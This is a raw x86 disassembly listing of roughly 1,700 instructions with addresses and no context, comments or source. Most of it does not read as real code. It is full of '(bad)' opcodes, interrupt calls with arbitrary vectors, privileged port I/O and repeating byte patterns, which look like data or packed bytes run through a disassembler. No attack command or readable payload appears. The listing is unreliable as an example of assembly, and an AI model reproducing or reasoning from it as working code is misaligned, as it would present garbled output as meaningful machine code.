  425b73:	add    eax,0xd4cf
  425b78:	add    bh,cl
  425b7a:	push   es
  425b7b:	nop
  425b7c:	add    BYTE PTR [eax],al
  425b7e:	add    BYTE PTR [eax-0x33],dh
  425b81:	jbe    0x425b80
  425b83:	int    0x8d
  425b85:	std    
  425b86:	sar    bh,0x63
  425b89:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b8c:	or     al,0xd3
  425b8e:	mov    ebp,0x28f2d392
  425b93:	push   ebx
  425b94:	shl    DWORD PTR [eax-0x33],cl
  425b97:	jbe    0x425bc5
  425b99:	iret   
  425b9a:	or     DWORD PTR [ecx-0x80],eax
  425b9d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425ba4:	add    BYTE PTR [eax-0x69ffb000],0x24
  425bab:	int    0x8d
  425bad:	push   esp
  425bae:	or     al,BYTE PTR [ecx-0x32528933]
  425bb4:	lea    esi,[ebp-0x6d82bad1]
  425bba:	shr    ebx,cl
  425bbc:	xchg   edx,eax
  425bbd:	int    0x8d
  425bbf:	lods   eax,DWORD PTR ds:[esi]
  425bc0:	int    0x96
  425bc2:	mov    ch,0x3b
  425bc4:	leave  
  425bc5:	cmp    ebx,edx
  425bc7:	push   ebx
  425bc8:	icebp  
  425bc9:	bound  eax,QWORD PTR [eax]
  425bcb:	(bad)  
  425bcc:	xor    al,0xd3
  425bce:	repnz sub BYTE PTR [eax],al
  425bd1:	(bad)  
  425bd2:	inc    esp
  425bd3:	mov    ebp,0xfb94
  425bd8:	int    0x76
  425bda:	lods   eax,DWORD PTR ds:[esi]
  425bdb:	int    0x8d
  425bdd:	mov    ch,0x2f
  425bdf:	inc    ebp
  425be0:	jge    0x425b74
  425be2:	shr    ebx,cl
  425be4:	xchg   edx,eax
  425be5:	int    0x8d
  425be7:	lods   eax,DWORD PTR ds:[esi]
  425be8:	int    0x96
  425bea:	mov    ch,0x3b
  425bec:	leave  
  425bed:	cmp    ebx,edx
  425bef:	push   ebx
  425bf0:	icebp  
  425bf1:	bound  eax,QWORD PTR [eax]
  425bf3:	(bad)  
  425bf4:	push   esp
  425bf5:	shl    edx,cl
  425bf7:	sub    BYTE PTR [eax],al
  425bf9:	(bad)  
  425bfa:	cmp    al,0xbd
  425bfc:	inc    esp
  425bfd:	sti    
  425bfe:	add    BYTE PTR [eax],al
  425c00:	int    0x76
  425c02:	std    
  425c03:	int    0x8d
  425c05:	std    
  425c06:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425c09:	repnz sub BYTE PTR [ebx],bh
  425c0c:	jns    0x425be1
  425c0e:	mov    ebp,0xcdd35392
  425c13:	(bad)  
  425c14:	std    
  425c15:	int    0x96
  425c17:	std    
  425c18:	cmp    ecx,DWORD PTR [edi]
  425c1a:	shr    ebx,cl
  425c1c:	xchg   edx,eax
  425c1d:	cmp    edx,ebp
  425c1f:	shr    edx,cl
  425c21:	sub    BYTE PTR [ebx+0x13],dl
  425c24:	xchg   ebx,edx
  425c26:	int    0x8d
  425c28:	std    
  425c29:	int    0x96
  425c2b:	std    
  425c2c:	cmp    ecx,DWORD PTR [edi]
  425c2e:	shr    ebx,cl
  425c30:	xchg   edx,eax
  425c31:	cmp    edx,ebp
  425c33:	shr    edx,cl
  425c35:	sub    BYTE PTR [ebx+0x13],dl
  425c38:	xchg   ebx,edx
  425c3a:	int    0x8d
  425c3c:	std    
  425c3d:	int    0x96
  425c3f:	std    
  425c40:	cmp    ecx,DWORD PTR [edi]
  425c42:	shr    ebx,cl
  425c44:	xchg   edx,eax
  425c45:	cmp    edx,ebp
  425c47:	shr    edx,cl
  425c49:	sub    BYTE PTR [ebx+0x13],dl
  425c4c:	xchg   ebx,edx
  425c4e:	or     al,BYTE PTR [esi]
  425c50:	nop
  425c51:	add    BYTE PTR [eax],al
  425c53:	add    ch,cl
  425c55:	jbe    0x425cab
  425c57:	int    0x80
  425c59:	int    0x8d
  425c5b:	mov    ebp,0x3bbd96cd
  425c60:	(bad)  
  425c62:	aad    0xd3
  425c64:	jmp    0x425bf8
  425c66:	shr    edx,cl
  425c68:	sub    BYTE PTR [ebx+0x13],dl
  425c6b:	or     al,BYTE PTR ds:0xd4cf
  425c71:	add    ch,cl
  425c73:	jbe    0x425cc1
  425c75:	int    0x80
  425c77:	int    0x8d
  425c79:	std    
  425c7a:	int    0x96
  425c7c:	std    
  425c7d:	cmp    ecx,DWORD PTR [edi]
  425c7f:	shr    ebx,cl
  425c81:	xchg   edx,eax
  425c82:	int    0x6c
  425c84:	jo     0x425cc1
  425c86:	aad    0xd3
  425c88:	jmp    0xcf05:0xa135328
  425c8f:	aam    0x0
  425c91:	add    BYTE PTR [eax],al
  425c93:	int    0x76
  425c95:	sbb    al,0xcd
  425c97:	lea    ebx,[ebx+edi*1]
  425c9a:	or     al,0xd3
  425c9c:	repnz sub BYTE PTR [ebx],bh
  425c9f:	jns    0x425c74
  425ca1:	mov    ebp,0xcdd35392
  425ca6:	(bad)  
  425ca7:	std    
  425ca8:	int    0x96
  425caa:	std    
  425cab:	cmp    edx,ebp
  425cad:	cmp    ecx,DWORD PTR [edi]
  425caf:	shr    edx,cl
  425cb1:	sub    bl,dl
  425cb3:	jmp    0x425c47
  425cb5:	push   ebx
  425cb6:	adc    ecx,ebp
  425cb8:	xchg   esi,eax
  425cb9:	std    
  425cba:	int    0xa6
  425cbc:	std    
  425cbd:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425cc3:	hlt    
  425cc4:	call   ebx
  425cc6:	in     eax,0x28
  425cc8:	push   ebx
  425cc9:	aad    0x87
  425ccb:	adc    ecx,DWORD PTR [edx]
  425ccd:	add    eax,0xd4cf
  425cd2:	add    ch,cl
  425cd4:	jbe    0x425cd3
  425cd6:	int    0x8d
  425cd8:	std    
  425cd9:	add    al,0x2
  425cdb:	call   ebx
  425cdd:	repnz sub BYTE PTR [ebx],bh
  425ce0:	jns    0x425cb5
  425ce2:	mov    ebp,0xcdd35392
  425ce7:	(bad)  
  425ce8:	std    
  425ce9:	int    0x96
  425ceb:	std    
  425cec:	add    al,0xfb
  425cee:	(bad)  
  425cef:	cmp    ecx,DWORD PTR [edi]
  425cf1:	shr    edx,cl
  425cf3:	sub    bl,dl
  425cf5:	jmp    0x425c89
  425cf7:	push   ebx
  425cf8:	adc    eax,DWORD PTR [edi-0x272322d]
  425cfe:	int    0x96
  425d00:	std    
  425d01:	add    al,0xfb
  425d03:	(bad)  
  425d04:	cmp    ecx,DWORD PTR [edi]
  425d06:	shr    edx,cl
  425d08:	sub    bl,dl
  425d0a:	jmp    0x425c9e
  425d0c:	push   ebx
  425d0d:	adc    ecx,edi
  425d0f:	pop    ss
  425d10:	nop
  425d11:	add    BYTE PTR [eax],al
  425d13:	add    BYTE PTR [edx-0x33],ah
  425d16:	xchg   esi,eax
  425d17:	std    
  425d18:	int    0xa6
  425d1a:	std    
  425d1b:	xchg   ebx,edx
  425d1d:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425d23:	int3   
  425d24:	push   es
  425d25:	aam    0x0
  425d27:	add    BYTE PTR [eax],al
  425d29:	int    0x76
  425d2b:	sub    al,0x4
  425d2d:	hlt    
  425d2e:	call   ebx
  425d30:	repz xchg edx,eax
  425d32:	shl    ebp,cl
  425d34:	sub    BYTE PTR [ebx-0x2b],dl
  425d37:	iret   
  425d38:	or     edi,ebp
  425d3a:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d41:	add    BYTE PTR [eax+0x50007162],0x0
  425d48:	xchg   esi,eax
  425d49:	and    al,0x6
  425d4b:	ins    DWORD PTR es:[edi],dx
  425d4c:	aam    0xbc
  425d4e:	int    0x76
  425d50:	in     eax,dx
  425d51:	int    0x8d
  425d53:	adc    DWORD PTR [edi],ebp
  425d55:	inc    ebp
  425d56:	jge    0x425cea
  425d58:	shr    ebx,cl
  425d5a:	xchg   edx,eax
  425d5b:	int    0xe3
  425d5d:	int    0x7d
  425d5f:	int    0x76
  425d61:	in     eax,dx
  425d62:	int    0x96
  425d64:	adc    DWORD PTR [ebx],edi
  425d66:	fidivr DWORD PTR [ebx]
  425d68:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d6f:	push   ebx
  425d70:	adc    ecx,ebp
  425d72:	xor    BYTE PTR [ebx-0x76],al
  425d75:	jo     0x425d44
  425d77:	xchg   esi,eax
  425d78:	push   esp
  425d79:	in     al,dx
  425d7a:	push   esp
  425d7b:	int    0x92
  425d7d:	int    0xa6
  425d7f:	push   eax
  425d80:	retf   0x5324
  425d83:	or     DWORD PTR [eax+ecx*4],esp
  425d86:	int    0x76
  425d88:	cmc    
  425d89:	int    0x8d
  425d8b:	stc    
  425d8c:	das    
  425d8d:	inc    ebp
  425d8e:	jge    0x425d22
  425d90:	shr    ebx,cl
  425d92:	xchg   edx,eax
  425d93:	int    0x8d
  425d95:	cmc    
  425d96:	int    0xa6
  425d98:	stc    
  425d99:	cmp    ecx,ecx
  425d9b:	cmp    ebx,ebp
  425d9d:	shl    edx,cl
  425d9f:	sub    ch,cl
  425da1:	lea    esi,[eax]
  425da3:	push   ebx
  425da4:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425daa:	int    0x1c
  425dac:	inc    ebx
  425dad:	(bad)  
  425dae:	jo     0x425dba
  425db0:	lea    esi,[eax]
  425db2:	or     cl,0xec
  425db5:	xchg   ch,cl
  425db7:	xchg   esi,eax
  425db8:	push   esp
  425db9:	int    0x76
  425dbb:	dec    esp
  425dbc:	int    0x4a
  425dbe:	int    0x20
  425dc0:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425dc6:	sbb    al,0xcd
  425dc8:	dec    edx
  425dc9:	xchg   ebp,ecx
  425dcb:	sub    eax,0xa808080
  425dd0:	lea    esi,[eax]
  425dd2:	int    0x4a
  425dd4:	int    0xa6
  425dd6:	push   eax
  425dd7:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425dde:	int    0x80
  425de0:	int    0x4a
  425de2:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425de6:	jbe    0x425dd5
  425de8:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425dee:	das    
  425def:	inc    ebp
  425df0:	jge    0x425d84
  425df2:	shr    ebx,cl
  425df4:	xchg   edx,eax
  425df5:	int    0x8d
  425df7:	in     eax,dx
  425df8:	int    0xa6
  425dfa:	adc    DWORD PTR [ebx],edi
  425dfc:	leave  
  425dfd:	cmp    ebx,ebp
  425dff:	shl    edx,cl
  425e01:	sub    BYTE PTR [ebx-0x3b],dl
  425e04:	or     dh,BYTE PTR [esi+0x44]
  425e07:	int    0x76
  425e09:	xor    bl,ch
  425e0b:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425e11:	in     eax,dx
  425e12:	int    0x8d
  425e14:	adc    DWORD PTR [edi],ebp
  425e16:	inc    ebp
  425e17:	jge    0x425dab
  425e19:	shr    ebx,cl
  425e1b:	xchg   edx,eax
  425e1c:	int    0x8d
  425e1e:	in     eax,dx
  425e1f:	int    0xa6
  425e21:	adc    ebx,edx
  425e23:	repnz sub ch,cl
  425e26:	lea    edx,[ebx+edi*1]
  425e29:	leave  
  425e2a:	cmp    ebx,ebp
  425e2c:	add    al,0xd3
  425e2e:	stc    
  425e2f:	push   ebx
  425e30:	(bad)
  425e33:	inc    ebx
  425e34:	shr    DWORD PTR [edi],cl
  425e36:	add    al,0xf7
  425e38:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e40:	dec    ebx
  425e41:	mov    BYTE PTR [ebx],dh
  425e43:	jge    0x425e4f
  425e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e46:	xor    al,0xa
  425e48:	lea    edi,[ecx*8+0x76cdf18d]
  425e4f:	xchg   ebp,eax
  425e50:	das    
  425e51:	inc    ebp
  425e52:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e58:	jbe    0x425e4b
  425e5a:	int    0xa6
  425e5c:	xchg   ebp,eax
  425e5d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e63:	cmp    esi,eax
  425e65:	cmp    ebx,ebp
  425e67:	push   ebx
  425e68:	or     al,0xcd
  425e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e6b:	stc    
  425e6c:	das    
  425e6d:	inc    ebp
  425e6e:	popf   
  425e6f:	xchg   edx,eax
  425e70:	or     dh,BYTE PTR [esi+0x54]
  425e73:	int    0x76
  425e75:	cmc    
  425e76:	push   ecx
  425e77:	out    0x54,al
  425e79:	add    al,0xd3
  425e7b:	dec    edx
  425e7c:	shr    esp,cl
  425e7e:	xchg   edx,eax
  425e7f:	int    0xa6
  425e81:	stc    
  425e82:	cmp    ebx,ebp
  425e84:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e8a:	int    0xa6
  425e8c:	cmc    
  425e8d:	int    0x8d
  425e8f:	stc    
  425e90:	das    
  425e91:	inc    ebp
  425e92:	or     al,0x92
  425e94:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e9a:	shr    ebx,cl
  425e9c:	xchg   edx,eax
  425e9d:	int    0x8d
  425e9f:	stc    
  425ea0:	cmp    ecx,ebx
  425ea2:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425ea8:	cmp    esp,ecx
  425eaa:	push   ebx
  425eab:	fcmovne st,st(5)
  425ead:	lea    esi,[edi+ebp*1]
  425eb0:	mov    ebx,0x2bc53389
  425eb5:	ror    ebp,cl
  425eb7:	(bad)  
  425eb8:	icebp  
  425eb9:	or     dh,BYTE PTR [esi+0x54]
  425ebc:	int    0x76
  425ebe:	xchg   ebp,eax
  425ebf:	das    
  425ec0:	inc    ebp
  425ec1:	rcl    DWORD PTR [edx-0x326d422d],cl
  425ec7:	jbe    0x425eba
  425ec9:	int    0xa6
  425ecb:	xchg   ebp,eax
  425ecc:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425ed2:	das    
  425ed3:	mov    ebx,0xa6020180
  425ed8:	cmp    ebx,ebp
  425eda:	dec    edx
  425edb:	or     al,0x1
  425edd:	ror    DWORD PTR [edx-0x2b],cl
  425ee0:	mov    ebp,0xbdbfcb3b
  425ee5:	or     ah,BYTE PTR [ebx]
  425ee7:	and    eax,0x92d3352f
  425eec:	shr    DWORD PTR [ebp+0x37d65692],cl
  425ef2:	ficom  WORD PTR [ebx]
  425ef4:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425ef7:	fidiv  WORD PTR [edi]
  425ef9:	ficom  WORD PTR [ebx]
  425efb:	(bad)  
  425efc:	ss inc ebx
  425efe:	or     al,0xd6
  425f00:	cs int 0x92
  425f03:	int    0x8d
  425f05:	xor    BYTE PTR [edi+0x548dcd81],al
  425f0b:	add    al,0x64
  425f0d:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425f13:	int    0x8d
  425f15:	xor    BYTE PTR [edi-0x7772327f],al
  425f1b:	xchg   DWORD PTR [esi+0x54],esi
  425f1e:	int    0x89
  425f20:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425f2a:	push   es
  425f2b:	and    eax,DWORD PTR [eax]
  425f2d:	add    BYTE PTR [eax],al
  425f2f:	in     al,dx
  425f30:	test   DWORD PTR [edi+0x25230abd],edi
  425f36:	int    0x76
  425f38:	adc    al,0x81
  425f3a:	jbe    0x425f80
  425f3c:	leave  
  425f3d:	jbe    0x425fac
  425f3f:	scas   al,BYTE PTR es:[edi]
  425f40:	aaa    
  425f41:	ficom  WORD PTR [ebx]
  425f43:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f49:	int    0x8d
  425f4b:	jne    0x425f7c
  425f4d:	inc    ebp
  425f4e:	jge    0x425ee2
  425f50:	shr    ebx,cl
  425f52:	xchg   edx,eax
  425f53:	int    0x8d
  425f55:	ins    DWORD PTR es:[edi],dx
  425f56:	int    0xa6
  425f58:	jne    0x425f2d
  425f5a:	repnz sub ch,cl
  425f5d:	lea    ecx,[ebp+ecx*8-0x77]
  425f61:	cmp    ecx,ecx
  425f63:	cmp    ebx,ebp
  425f65:	push   ebx
  425f66:	(bad)
  425f69:	shl    esp,cl
  425f6b:	int    0x8d
  425f6d:	inc    esp
  425f6e:	inc    ebx
  425f6f:	mov    BYTE PTR [edi+0x54],dh
  425f72:	int    0x76
  425f74:	xor    BYTE PTR [edi+0x760a1476],al
  425f7a:	xor    ch,cl
  425f7c:	ins    BYTE PTR es:[edi],dx
  425f7d:	test   BYTE PTR [edx],cl
  425f7f:	jbe    0x425f95
  425f81:	int    0x76
  425f83:	in     eax,dx
  425f84:	int    0x8d
  425f86:	adc    DWORD PTR [edi],ebp
  425f88:	inc    ebp
  425f89:	jge    0x425f1d
  425f8b:	shr    ebx,cl
  425f8d:	xchg   edx,eax
  425f8e:	int    0x8d
  425f90:	in     eax,dx
  425f91:	int    0xa6
  425f93:	adc    DWORD PTR [ebx],edi
  425f95:	fnstsw WORD PTR [ebx]
  425f97:	leave  
  425f98:	push   ebx
  425f99:	(bad)
  425f9c:	sub    BYTE PTR [esi+0x76],bl
  425f9f:	adc    al,0x2f
  425fa1:	push   es
  425fa2:	mov    esi,0xcd0000ff
  425fa7:	(bad)  
  425fa8:	std    
  425fa9:	int    0x96
  425fab:	std    
  425fac:	cmp    ecx,DWORD PTR [edi]
  425fae:	shr    ebx,cl
  425fb0:	xchg   edx,eax
  425fb1:	sar    bh,0x9c
  425fb4:	cmp    esi,ecx
  425fb6:	shr    edx,cl
  425fb8:	sub    BYTE PTR [ebx+0x13],dl
  425fbb:	int    0x96
  425fbd:	std    
  425fbe:	int    0xa6
  425fc0:	std    
  425fc1:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fc7:	popf   
  425fc8:	shl    ebp,cl
  425fca:	sub    BYTE PTR [ebx-0x2b],dl
  425fcd:	xchg   DWORD PTR [ebx],edx
  425fcf:	int    0x96
  425fd1:	std    
  425fd2:	int    0xa6
  425fd4:	std    
  425fd5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fdb:	popf   
  425fdc:	shl    ebp,cl
  425fde:	sub    BYTE PTR [ebx-0x2b],dl
  425fe1:	xchg   DWORD PTR [ebx],edx
  425fe3:	int    0x96
  425fe5:	std    
  425fe6:	int    0xa6
  425fe8:	std    
  425fe9:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425fef:	xchg   edx,eax
  425ff0:	shl    ebp,cl
  425ff2:	sub    BYTE PTR [ebx-0x2b],dl
  425ff5:	xchg   DWORD PTR [ebx],edx
  425ff7:	or     cl,bh
  425ff9:	nop
  425ffa:	add    BYTE PTR [eax],al
  425ffc:	add    ch,cl
  425ffe:	lea    edx,[eax-0x33]
  426001:	xchg   esi,eax
  426002:	mov    ebp,0x3bbda6cd
  426007:	cdq    
  426008:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42600e:	in     eax,0x28
  426010:	push   ebx
  426011:	aad    0xa
  426013:	int3   
  426014:	pop    ss
  426015:	aam    0x0
  426017:	add    BYTE PTR [eax],al
  426019:	int    0x8d
  42601b:	dec    esp
  42601c:	int    0x89
  42601e:	int    0x96
  426020:	std    
  426021:	int    0xa6
  426023:	std    
  426024:	int    0x7e
  426026:	jo     0x426063
  426028:	cdq    
  426029:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42602f:	in     eax,0x28
  426031:	push   ebx
  426032:	aad    0xa
  426034:	int3   
  426035:	pop    ss
  426036:	aam    0x0
  426038:	add    BYTE PTR [eax],al
  42603a:	int    0x8d
  42603c:	sbb    al,0xcd
  42603e:	xchg   esi,eax
  42603f:	sbb    al,0x3b
  426041:	icebp  
  426042:	shr    edx,cl
  426044:	sub    BYTE PTR [ebx],bh
  426046:	psrlq  mm5,mm3
  426049:	xchg   edx,eax
  42604a:	push   ebx
  42604b:	adc    ecx,ebp
  42604d:	xchg   esi,eax
  42604e:	std    
  42604f:	int    0xa6
  426051:	std    
  426052:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426058:	cdq    
  426059:	shl    ebp,cl
  42605b:	sub    bl,dl
  42605d:	repz xchg edx,eax
  42605f:	push   ebx
  426060:	aad    0xcd
  426062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426063:	std    
  426064:	cmp    edi,DWORD PTR [ecx+0x4]
  426067:	hlt    
  426068:	call   ebx
  42606a:	mov    ebp,0x28e5d392
  42606f:	push   ebx
  426070:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426076:	aam    0x0
  426078:	add    BYTE PTR [eax],al
  42607a:	int    0x8d
  42607c:	std    
  42607d:	int    0x96
  42607f:	std    
  426080:	cmp    ecx,DWORD PTR [edi]
  426082:	shr    ebx,cl
  426084:	xchg   edx,eax
  426085:	sar    bh,0x9c
  426088:	cmp    esi,ecx
  42608a:	shr    edx,cl
  42608c:	sub    BYTE PTR [ebx+0x13],dl
  42608f:	int    0x96
  426091:	std    
  426092:	int    0xa6
  426094:	std    
  426095:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42609b:	popf   
  42609c:	shl    ebp,cl
  42609e:	sub    BYTE PTR [ebx-0x2b],dl
  4260a1:	xchg   DWORD PTR [ebx],edx
  4260a3:	int    0x96
  4260a5:	std    
  4260a6:	int    0xa6
  4260a8:	std    
  4260a9:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4260af:	popf   
  4260b0:	shl    ebp,cl
  4260b2:	sub    BYTE PTR [ebx-0x2b],dl
  4260b5:	xchg   DWORD PTR [ebx],edx
  4260b7:	iret   
  4260b8:	xchg   esi,eax
  4260b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260ba:	or     dl,BYTE PTR ds:0xd4cf
  4260c0:	add    bh,cl
  4260c2:	iret   
  4260c3:	nop
  4260c4:	add    BYTE PTR [eax],al
  4260c6:	add    BYTE PTR [ecx-0x33],dh
  4260c9:	(bad)  
  4260ca:	std    
  4260cb:	int    0x96
  4260cd:	std    
  4260ce:	cmp    ecx,DWORD PTR [edi]
  4260d0:	int    0xd6
  4260d2:	sub    al,0x3b
  4260d4:	icebp  
  4260d5:	shr    ebx,cl
  4260d7:	xchg   edx,eax
  4260d8:	shr    edx,cl
  4260da:	sub    BYTE PTR [ebx+0x13],dl
  4260dd:	jno    0x4260ae
  4260df:	pop    es
  4260e0:	out    dx,eax
  4260e1:	add    BYTE PTR [eax+0x7cd7080],0x3d
  4260e8:	add    DWORD PTR [eax+0x500080],0x7cd2496
  4260f2:	add    DWORD PTR [ecx+0x760a8080],eax
  4260f8:	dec    esp
  4260f9:	int    0x76
  4260fb:	mov    ch,cl
  4260fd:	mov    BYTE PTR [edi-0x72f5b373],al
  426103:	dec    esp
  426104:	int    0x8d
  426106:	cmc    
  426107:	int    0x96
  426109:	stc    
  42610a:	das    
  42610b:	inc    ebp
  42610c:	jecxz  0x4260a0
  42610e:	shl    ebx,cl
  426110:	xchg   edx,eax
  426111:	int    0x96
  426113:	cmc    
  426114:	int    0xd6
  426116:	stc    
  426117:	cmp    esi,edi
  426119:	shr    edx,cl
  42611b:	sub    ch,cl
  42611d:	xchg   esi,eax
  42611e:	cmc    
  42611f:	cmp    esi,eax
  426121:	push   ebx
  426122:	bswap  ebp
  426124:	(bad)  
  426125:	stc    
  426126:	das    
  426127:	inc    ebp
  426128:	sti    
  426129:	xchg   edx,eax
  42612a:	shr    edi,cl
  42612c:	xchg   edx,eax
  42612d:	int    0xd6
  42612f:	cmc    
  426130:	int    0xa6
  426132:	stc    
  426133:	cmp    ebx,ecx
  426135:	cmp    ebx,ebp
  426137:	push   ebx
  426138:	aad    0x87
  42613a:	adc    ecx,ebp
  42613c:	xchg   esi,eax
  42613d:	cmc    
  42613e:	sar    DWORD PTR [ecx-0x62932d8],cl
  426144:	das    
  426145:	inc    ebp
  426146:	sti    
  426147:	xchg   edx,eax
  426148:	shr    edi,cl
  42614a:	xchg   edx,eax
  42614b:	int    0xd6
  42614d:	cmc    
  42614e:	int    0xa6
  426150:	stc    
  426151:	cmp    ebx,ecx
  426153:	cmp    ebx,ebp
  426155:	push   ebx
  426156:	aad    0x87
  426158:	adc    ecx,ebp
  42615a:	xchg   esi,eax
  42615b:	cmc    
  42615c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426162:	das    
  426163:	inc    ebp
  426164:	sti    
  426165:	xchg   edx,eax
  426166:	shr    edi,cl
  426168:	xchg   edx,eax
  426169:	int    0xd6
  42616b:	cmc    
  42616c:	cmp    ebx,ecx
  42616e:	int    0xe6
  426170:	stc    
  426171:	cmp    eax,DWORD PTR [eax]
  426173:	push   ebx
  426174:	fld    DWORD PTR [edi+0x707113]
  42617a:	(bad)  
  42617b:	dec    esp
  42617c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426182:	add    BYTE PTR [eax],al
  426184:	int    0x76
  426186:	or     eax,0xcb63a8aa
  42618b:	rcl    BYTE PTR [eax-0x80],cl
  42618e:	xchg   esi,eax
  42618f:	int    0xed
  426191:	add    al,0xed
  426193:	inc    esp
  426194:	pop    ebx
  426195:	cwde   
  426196:	call   0x76c9:0xcb3bdd3b
  42619d:	popf   
  42619e:	(bad)  
  42619f:	aaa    
  4261a0:	ficom  WORD PTR [ebx]
  4261a2:	pop    ebp
  4261a3:	mov    ebp,0xa25230a
  4261a8:	jbe    0x42614f
  4261aa:	leave  
  4261ab:	jbe    0x42616a
  4261ad:	xchg   ecx,eax
  4261ae:	aaa    
  4261af:	ficom  WORD PTR [ebx]
  4261b1:	or     dh,BYTE PTR [esi-0x13]
  4261b4:	leave  
  4261b5:	jbe    0x4261a4
  4261b7:	dec    ecx
  4261b8:	mov    al,ds:0x76c93586
  4261bd:	cmc    
  4261be:	dec    ecx
  4261bf:	lahf   
  4261c0:	xchg   BYTE PTR ds:0x691176c9,dh
  4261c6:	and    DWORD PTR [esi+0x1176c935],eax
  4261cc:	cmp    DWORD PTR [ecx],esp
  4261ce:	xchg   BYTE PTR ds:0x49f976c9,dh
  4261d4:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  4261db:	jbe    0x4261d6
  4261dd:	int    0x76
  4261df:	sbb    al,0xcd
  4261e1:	shl    BYTE PTR ds:0xcd808081,1
  4261e7:	jbe    0x426205
  4261e9:	int    0x8d
  4261eb:	sbb    al,0xcd
  4261ed:	add    DWORD PTR ds:0xcd808081,ebp
  4261f3:	xor    ch,cl
  4261f5:	pop    esp
  4261f6:	xchg   eax,esp
  4261f8:	fs int 0x96
  4261fb:	popf   
  4261fc:	int    0xa
  4261fe:	and    eax,0xa808081
  426203:	out    0xb5,al
  426205:	int    0xe6
  426207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426208:	das    
  426209:	inc    ebp
  42620a:	add    edx,DWORD PTR [edx-0x326def2d]
  426210:	out    0x9d,al
  426212:	int    0xa6
  426214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426215:	adc    bh,bl
  426217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426218:	mov    esi,0xdd3b4229
  42621d:	shr    ecx,cl
  42621f:	sub    ch,cl
  426221:	pop    esi
  426222:	push   ebx
  426223:	aad    0x43
  426225:	(bad)  
  426227:	nop
  426228:	int    0x18
  42622a:	or     dl,BYTE PTR [esi+0x1496cdf9]
  426230:	int    0x96
  426232:	xor    ch,cl
  426234:	xchg   esi,eax
  426235:	dec    esp
  426236:	iret   
  426237:	xchg   esi,eax
  426238:	lods   eax,DWORD PTR ds:[esi]
  426239:	bound  eax,QWORD PTR [eax]
  42623b:	(bad)  
  42623c:	stc    
  42623d:	jno    0x4262af
  42623f:	cwde   
  426240:	add    dh,dl
  426242:	sbb    al,0xcf
  426244:	jbe    0x4261fb
  426246:	add    dh,dl
  426248:	mov    BYTE PTR [eax],al
  42624a:	(bad)  
  42624b:	cmc    
  42624c:	add    dh,dl
  42624e:	adc    DWORD PTR [eax],eax
  426250:	(bad)  
  426251:	in     eax,dx
  426252:	jo     0x426223
  426254:	jbe    0x426253
  426256:	jo     0x426215
  426258:	stos   BYTE PTR es:[edi],al
  426259:	clc    
  42625a:	add    BYTE PTR [eax],al
  42625c:	or     dh,BYTE PTR [esi+0x1c]
  42625f:	int    0x76
  426261:	sbb    al,0xcd
  426263:	lea    esp,[edx+ecx*1]
  426266:	outs   dx,BYTE PTR ds:[esi]
  426267:	adc    al,0xcd
  426269:	jbe    0x42628f
  42626b:	leave  
  42626c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426273:	lods   eax,DWORD PTR ds:[esi]
  426274:	int    0x8d
  426276:	and    al,0xa
  426278:	outs   dx,BYTE PTR ds:[esi]
  426279:	test   ch,cl
  42627b:	jbe    0x4262ad
  42627d:	int    0x8d
  42627f:	and    al,0xa
  426281:	outs   dx,BYTE PTR ds:[esi]
  426282:	mov    ch,cl
  426284:	jbe    0x42629a
  426286:	int    0x8d
  426288:	and    al,0xa
  42628a:	outs   dx,BYTE PTR ds:[esi]
  42628b:	dec    esp
  42628c:	int    0x76
  42628e:	and    al,0xc9
  426290:	ins    BYTE PTR es:[edi],dx
  426291:	and    al,0x81
  426293:	add    BYTE PTR [eax-0x32e11380],0x76
  42629a:	sbb    al,0xcd
  42629c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  4262a3:	or     ch,0xa
  4262a6:	and    eax,0xcd808081
  4262ab:	xor    BYTE PTR [ebx],0x81
  4262ae:	or     dh,BYTE PTR [esi-0x3]
  4262b1:	int    0x76
  4262b3:	std    
  4262b4:	stos   BYTE PTR es:[edi],al
  4262b5:	test   al,0x63
  4262b7:	retf   
